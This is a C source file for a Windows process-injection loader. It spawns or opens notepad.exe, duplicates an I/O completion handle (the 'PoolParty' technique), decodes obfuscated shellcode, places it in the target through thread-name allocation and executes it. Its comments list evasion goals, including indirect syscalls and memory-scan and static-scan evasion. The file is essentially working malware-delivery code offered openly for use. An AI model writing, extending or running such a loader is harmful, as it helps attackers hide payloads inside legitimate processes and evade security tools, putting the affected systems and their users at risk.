#include <windows.h>
#include <tlhelp32.h>
#include <unwin.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "debugging/debugging.h"
#include "injection/injection.h"
#include "memory/memory.h"
#include "shellcode/shellcode.h"
#include "syscalls/syscalls.h"

extern Ade GlobalAde;

// TODO: to indirect: SpawnTargetProcess, refactoring

/* Objectives:
    * Inject with PoolParty I/O (starting thread) (DONE)
    * Indirect syscalls (dynamic evasion) (DONE)
    * ThreadName alloc (memory scan evasion) (DONE)
    * Heap/stack encryption (memory scan evasion)
    * Shellcode obfuscation (static evasion) (DONE)

    * EXTRA: impl. DLL, PE or shellcode injection 
*/

#define TARGET_PROCNAME "notepad.exe"

/* Conditional defines */
#define CREATE_NEW_PROCESS     // Create a new process (the target process) for injection 
// #define DLL_INJECTION       // Inject a DLL (WORKING IN PROCESS)
// #define PE_INJECTION        // Inject a PE  (WORKING IN PROCESS)
// #define SHELLCODE_INJECTION // Inject a Shellcode (WORKING IN PROCESS)

WINBOOL SpawnTargetProcess(PHANDLE hProcess) {
    STARTUPINFOA        startupInfo;
    PROCESS_INFORMATION processInformation;

    ZeroMemory( &startupInfo, sizeof(startupInfo) );
    startupInfo.cb = sizeof(startupInfo);
    ZeroMemory( &processInformation, sizeof(processInformation) );

    return CreateProcessA(
        TARGET_PROCNAME,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &startupInfo,
        &processInformation
    );
}

int GetPidByName(char* processName) {
    int pid = 0;
    PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First( snapshot, &pe32 )) {
        do {
            if (strcmp(pe32.szExeFile, processName) == 0) {
                pid = pe32.th32ProcessID;
            }
        } while (Process32Next(snapshot, &pe32));
    }

    return pid;
}

int main() {
	MEMORY_ALLOC memoryShellcodeAlloc;
	HANDLE       hProcess;

    GlobalAde = InitAde();
    int pid   = GetPidByName(TARGET_PROCNAME);

#ifdef CREATE_NEW_PROCESS
    if ( !SpawnTargetProcess(&hProcess) ) {
        DEBUG_ERROR("CreateProcessA: 0x%lx", GetLastError())
        DEBUG_GETCHAR()
        return -1;
    }
#else
	hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        pid
    );

    if (!hProcess) {
        DEBUG_ERROR("OpenProcess: 0x%lx", GetLastError())
        DEBUG_GETCHAR()
        return -1;
    }
#endif

    HANDLE completionIoHandle = DuplicateHandleK(
        hProcess,
        pid,
        IO_COMPLETION_HANDLETYPE
    );

    size_t shellcodeSize = GetShellcodeSize();
    BYTE shellcode[ shellcodeSize ];
    ShellcodeDecode(shellcode);

    if (!ThreadNameAlloc(
    	hProcess,
    	shellcode,
    	shellcodeSize,
    	&memoryShellcodeAlloc
    )) {
    	DEBUG_ERROR("FAILED ThreadNameAlloc")
    	return FALSE;
    }

    DEBUG_INFO("Execution Addr @ 0x%p", memoryShellcodeAlloc.executionAddr);
    Inject(hProcess, completionIoHandle, memoryShellcodeAlloc.executionAddr);

    DEBUG_GETCHAR()

    return 0;
}
